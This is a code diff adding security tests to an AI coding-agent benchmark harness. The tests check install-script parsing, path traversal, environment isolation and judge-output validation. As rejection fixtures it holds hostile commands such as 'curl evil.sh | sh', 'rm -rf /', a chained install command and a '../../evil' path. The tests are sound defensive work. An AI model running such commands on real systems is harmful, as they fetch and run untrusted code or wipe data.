@@ -12,7 +12,9 @@ import { cacheRecallEvalToFinalCheckOutput } from '../agent-runner'
 import { formatAgentResult } from '../format-output'
 import { judgeCommitResult } from '../judge'
 import {
+  installBinaries,
   mergeIdiomPatternFindings,
+  parseInstallScriptArgv,
   runTask,
   summarizeAgentRuns,
 } from '../run-buffbench'
@@ -163,6 +165,178 @@ describe('generateEvalTask', () => {
   })
 })
 
+describe('parseInstallScriptArgv', () => {
+  test('splits valid npm/bun one-liners into an argv array', () => {
+    expect(
+      parseInstallScriptArgv('npm install left-pad', 'binInstalls[].installScript'),
+    ).toEqual(['npm', 'install', 'left-pad'])
+    expect(
+      parseInstallScriptArgv('bun add tsx', 'binInstalls[].installScript'),
+    ).toEqual(['bun', 'add', 'tsx'])
+  })
+
+  test('rejects anything that is not a plain npm/bun install one-liner', () => {
+    for (const script of [
+      'curl evil.sh | sh',
+      'rm -rf /',
+      'npm install left-pad && curl evil.sh | sh',
+      'npm install "left-pad"',
+      'npm run evil',
+      'npm',
+    ]) {
+      expect(() =>
+        parseInstallScriptArgv(script, 'binInstalls[].installScript'),
+      ).toThrow(/binInstalls\[\]\.installScript/)
+    }
+  })
+})
+
+describe('installBinaries', () => {
+  test('executes a valid npm install script via the argv path, never through a shell string', () => {
+    const calls: Array<{
+      file: string
+      args: string[]
+      options?: { cwd: string; stdio: string; env: NodeJS.ProcessEnv }
+    }> = []
+    const result = installBinaries(
+      [
+        {
+          name: 'left-pad',
+          installScript: 'npm install left-pad',
+          binPath: 'node_modules/.bin/left-pad',
+        },
+      ],
+      (file, args, options) => {
+        calls.push({ file, args, options })
+        // Simulate the install producing the expected binary so the PATH
+        // wiring is exercised without running real npm.
+        fs.mkdirSync(path.join(options.cwd, 'node_modules/.bin'), {
+          recursive: true,
+        })
+        fs.writeFileSync(
+          path.join(options.cwd, 'node_modules/.bin/left-pad'),
+          '',
+        )
+        return Buffer.from('')
+      },
+    )
+
+    expect(calls).toHaveLength(1)
+    expect(calls[0]!.file).toBe('npm')
+    expect(calls[0]!.args).toEqual(['install', 'left-pad'])
+    const options = calls[0]!.options!
+    expect(options.stdio).toBe('ignore')
+    expect(options.cwd).toContain('codebuff-bins-')
+    expect(options.env.INSTALL_DIR).toBe(options.cwd)
+    expect(result.env.PATH).toContain(options.cwd)
+
+    fs.rmSync(options.cwd, { recursive: true, force: true })
+  })
+
+  test('never executes an install script that is not a plain npm/bun one-liner', () => {
+    let execCalls = 0
+    const execInstall = () => {
+      execCalls += 1
+      return Buffer.from('')
+    }
+
+    expect(() =>
+      installBinaries(
+        [
+          {
+            name: 'evil',
+            installScript: 'curl evil.sh | sh',
+            binPath: 'evil',
+          },
+        ],
+        execInstall,
+      ),
+    ).toThrow(/binInstalls\[\]\.installScript/)
+    expect(() =>
+      installBinaries(
+        [
+          {
+            name: 'dangerous',
+            installScript: 'rm -rf /',
+            binPath: 'dangerous',
+          },
+        ],
+        execInstall,
+      ),
+    ).toThrow(/binInstalls\[\]\.installScript/)
+    expect(execCalls).toBe(0)
+  })
+
+  test('never executes or PATH-adds a binPath that escapes the install directory', () => {
+    let execCalls = 0
+    const execInstall = () => {
+      execCalls += 1
+      return Buffer.from('')
+    }
+
+    expect(() =>
+      installBinaries(
+        [
+          {
+            name: 'evil',
+            installScript: 'npm install evil',
+            binPath: '../../evil',
+          },
+        ],
+        execInstall,
+      ),
+    ).toThrow(/escapes the installation directory/)
+    expect(execCalls).toBe(0)
+  })
+
+  test('passes only a minimal allowlist env to the untrusted install process', () => {
+    const secretKey = 'BUFFBENCH_TEST_SECRET_TOKEN'
+    process.env[secretKey] = 'super-secret-value'
+    const calls: Array<{
+      file: string
+      args: string[]
+      options?: { cwd: string; stdio: string; env: Record<string, string> }
+    }> = []
+    let result: ReturnType<typeof installBinaries> | null = null
+    try {
+      result = installBinaries(
+        [
+          {
+            name: 'left-pad',
+            installScript: 'npm install left-pad',
+            binPath: 'node_modules/.bin/left-pad',
+          },
+        ],
+        (file, args, options) => {
+          calls.push({ file, args, options })
+          // Simulate the install producing the expected binary so the PATH
+          // wiring is exercised without running real npm.
+          fs.mkdirSync(path.join(options.cwd, 'node_modules/.bin'), {
+            recursive: true,
+          })
+          fs.writeFileSync(
+            path.join(options.cwd, 'node_modules/.bin/left-pad'),
+            '',
+          )
+          return Buffer.from('')
+        },
+      )
+
+      const env = calls[0]!.options!.env
+      expect(Object.keys(env).sort()).toEqual(['HOME', 'INSTALL_DIR', 'PATH'])
+      expect(env.INSTALL_DIR).toBe(calls[0]!.options!.cwd)
+      expect(env.PATH).toBe(process.env.PATH ?? '/usr/bin:/bin')
+      expect(env.HOME).toBe(process.env.HOME ?? os.homedir())
+      expect(env[secretKey]).toBeUndefined()
+    } finally {
+      delete process.env[secretKey]
+      if (result?.tempDir) {
+        fs.rmSync(result.tempDir, { recursive: true, force: true })
+      }
+    }
+  })
+})
+
 describe('judgeCommitResult', () => {
   test('includes the generated task spec in every judge prompt', async () => {
     const judgePrompts: string[] = []
@@ -219,6 +393,126 @@ describe('judgeCommitResult', () => {
       expect(prompt).toContain(
         'The implementation must update the cache and expose a new status line.',
       )
+    }
+  })
+
+  test('treats schema-violating judge output as a failed judge (all_judges_failed)', async () => {
+    const client = {
+      run: async () => ({
+        output: {
+          type: 'structuredOutput' as const,
+          value: {
+            analysis: 'ok',
+            strengths: [],
+            weaknesses: [],
+            // Judge-model-controlled JSON with a wrong-typed score must never
+            // be trusted via a blind cast.
+            completionScore: 'high',
+            codeQualityScore: 5,
+            overallScore: 5,
+          },
+        },
+      }),
+    } as unknown as OpenbuffClient
+    const commit: EvalCommitV2 = {
+      id: 'schema-violation-task',
+      sha: 'abc123',
+      parentSha: 'def456',
+      spec: 'Spec.',
+      prompt: 'Do it.',
+      supplementalFiles: [],
+      fileDiffs: [],
+    }
+
+    const result = await judgeCommitResult({
+      client,
+      commit,
+      contextFiles: {},
+      agentDiff: '',
+    })
+
+    expect(result.scoringStatus).toBe('all_judges_failed')
+    expect(result.overallScore).toBe(0)
+  })
+
+  test('sanitizes the commit id in the judge-error debug artifact path', async () => {
+    const client = {
+      run: async () => ({
+        output: {
+          type: 'text' as const,
+          value: 'judge did not produce structured output',
+        },
+      }),
+    } as unknown as OpenbuffClient
+    const commit: EvalCommitV2 = {
+      id: 'escape/../task',
+      sha: 'abc123',
+      parentSha: 'def456',
+      spec: 'Spec.',
+      prompt: 'Do it.',
+      supplementalFiles: [],
+      fileDiffs: [],
+    }
+    // judge.ts resolves its debug-artifact path from ITS OWN __dirname
+    // (evals/buffbench) joined with '..', so the write lands in evals/.
+    // Assert the sanitized filenames exist there and that the raw-id path
+    // did NOT escape via '../' (pre-fix it would have written
+    // evals/task-<judge>-agent-output-error.json).
+    const judgeWriteDir = path.join(__dirname, '..', '..')
+    const sanitizedGemini = path.join(
+      judgeWriteDir,
+      'escape____task-judge-gemini-agent-output-error.json',
+    )
+    const sanitizedGpt = path.join(
+      judgeWriteDir,
+      'escape____task-judge-gpt-agent-output-error.json',
+    )
+    // The unsanitized raw id would produce these traversal artifacts.
+    const escapedGemini = path.join(
+      judgeWriteDir,
+      'task-judge-gemini-agent-output-error.json',
+    )
+    const escapedGpt = path.join(
+      judgeWriteDir,
+      'task-judge-gpt-agent-output-error.json',
+    )
+    // Clean leftovers from earlier runs so the assertions are self-contained.
+    for (const file of [
+      sanitizedGemini,
+      sanitizedGpt,
+      escapedGemini,
+      escapedGpt,
+    ]) {
+      fs.rmSync(file, { force: true })
+    }
+
+    try {
+      const result = await judgeCommitResult({
+        client,
+        commit,
+        contextFiles: {},
+        agentDiff: '',
+      })
+
+      expect(result.scoringStatus).toBe('all_judges_failed')
+
+      // The sanitized id (only [a-zA-Z0-9-]) produces a flat filename that
+      // stays exactly in judge's write directory ('escape/../task' has 4
+      // non-alphanumeric chars → 4 underscores).
+      expect(fs.existsSync(sanitizedGemini)).toBe(true)
+      expect(fs.existsSync(sanitizedGpt)).toBe(true)
+      // The raw-id traversal must never materialize.
+      expect(fs.existsSync(escapedGemini)).toBe(false)
+      expect(fs.existsSync(escapedGpt)).toBe(false)
+    } finally {
+      for (const file of [
+        sanitizedGemini,
+        sanitizedGpt,
+        escapedGemini,
+        escapedGpt,
+      ]) {
+        fs.rmSync(file, { force: true })
+      }
     }
   })
 
